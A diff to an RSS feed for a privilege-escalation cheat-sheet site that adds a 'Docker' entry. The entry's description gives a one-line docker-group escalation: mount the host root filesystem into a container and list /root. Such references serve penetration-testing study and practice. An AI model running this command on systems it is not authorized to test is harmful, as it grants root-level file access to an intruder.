@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@privesc/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Docker</title>
+      <link>https://tldrbins.github.io/docker/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/docker/</guid>
+      <description> Privesc docker group docker run -v /:/mnt -it bash bash ls /mnt/root </description>
+    </item>
+    <item>
       <title>lxd</title>
       <link>https://tldrbins.github.io/lxd/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
